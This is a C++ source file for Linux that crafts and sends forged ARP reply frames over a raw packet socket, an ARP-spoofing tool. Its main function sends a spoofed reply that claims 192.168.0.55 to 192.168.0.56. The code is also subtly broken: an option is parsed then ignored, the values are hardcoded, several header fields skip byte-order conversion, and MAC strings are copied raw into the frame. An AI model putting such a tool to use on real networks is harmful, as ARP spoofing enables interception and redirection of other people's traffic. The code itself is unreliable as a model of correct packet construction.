#include <iostream>
#include <cstdio>
#include <string>
#include <fstream>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h> 
#include <net/ethernet.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

using namespace std;

void SerializeMacStr(const string& mac_str, char* mac_hex);
string GetLocalMac(const string& net_interface);
bool SendSpoofArpReply(const string& net_interface,
                const string& spoof_mac,
                const string& spoof_ip,
                const string& target_mac,
                const string& target_ip);

struct ArpMsg
{
    unsigned short HardwareType;
    unsigned short ProtocolType;
    unsigned char HardwareAddrSize;
    unsigned char ProtocolAddrSize;
    unsigned short Operation;
    char SenderMacAddr[6];
    char SenderIpAddr[4];
    char TargetMacAddr[6];
    char TargetIpAddr[4];

    ArpMsg(unsigned short operation,
        const string& sender_mac,
        const string& sender_ip,
        const string& target_mac,
        const string& target_ip)
    {
        HardwareType = htons(1); // Ethernet
        ProtocolType = htons(2048); // IP
        HardwareAddrSize = 6;
        ProtocolAddrSize = 4;
        Operation = operation;
        unsigned int u_sender_ip = inet_addr(sender_ip.c_str());
        if (INADDR_NONE != u_sender_ip)
        {
            memcpy(SenderIpAddr, &u_sender_ip ,sizeof(unsigned int));
        }
        unsigned int u_target_ip = inet_addr(target_ip.c_str());
        if (INADDR_NONE != u_target_ip)
        {
            memcpy(TargetIpAddr, &u_target_ip ,sizeof(unsigned int));
        }
        SerializeMacStr(sender_mac, SenderMacAddr);
        SerializeMacStr(target_mac, TargetMacAddr);
    }
};

// ARP, Ethernet v2
struct ArpEthernetFrame
{
    char DestinationAddr[6];
    char SourceAddr[6];
    unsigned short Type;
    char Data[46];
    int Crc;

    ArpEthernetFrame(const string& dest_addr,
                const string& src_addr,
                ArpMsg* data)
    {
        Type = ETH_P_ARP;
        Crc = 0;
        memcpy(DestinationAddr, dest_addr.c_str(), sizeof(DestinationAddr));
        memcpy(SourceAddr, src_addr.c_str(), sizeof(SourceAddr));
        memcpy(Data, data, sizeof(Data));
    }
};

int main(int argc, char* argv[])
{
    string net_if;
    string target_ip;
    string spoof_ip;
    string spoof_mac;
    int opt = -1;
    while((opt=getopt(argc, argv, "i:t:s:")) != -1)
    {
        switch(opt)
        {
        case 'i':
            net_if = optarg;
            break;
        case 't':
            target_ip = optarg;
            break;
        case 's':
            break;
        default:
            break;
        }
    }

    cout << GetLocalMac("ens33") <<endl;
    bool ret = SendSpoofArpReply("ens33", "00:00:00:00:00:00", "192.168.0.55",
                    "00:00:00:00:00:00", "192.168.0.56");
    cout << ret <<endl;

    return 0;
}

void SerializeMacStr(const string& mac_str, char* mac_hex)
{
    sscanf(mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
        mac_hex, mac_hex + 1, mac_hex + 2, mac_hex + 3,
        mac_hex + 4, mac_hex + 5);
}

string GetLocalMac(const string& net_interface)
{
    string file_path = "/sys/class/net/" + net_interface + "/address";
    ifstream mac_file(file_path);
    string mac_addr;
    mac_file >> mac_addr;
    return mac_addr;
}

bool SendSpoofArpReply(const string& net_interface,
                const string& spoof_mac,
                const string& spoof_ip,
                const string& target_mac,
                const string& target_ip)
{
    // Create socket
    int arp_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (arp_socket < 0)
    {
        cout << "Create socket failed" << endl;
        return false;
    }

    // Get Interface index
    sockaddr_ll device;
    device.sll_ifindex = if_nametoindex (net_interface.c_str());
    device.sll_family = AF_PACKET;
    device.sll_halen = 6;

    // send packet
    ArpMsg arp_msg(2, spoof_mac, spoof_ip, target_mac, target_ip);
    ArpEthernetFrame frame(target_mac, GetLocalMac(net_interface), &arp_msg);
    auto res = sendto(arp_socket, &frame, 42, 0, (sockaddr*)&device, sizeof (device));
    if (res <= 0)
    {
        cout << "Send packet failed" << endl;
        close(arp_socket);
        return false;
    }

    close(arp_socket);
    return true;
}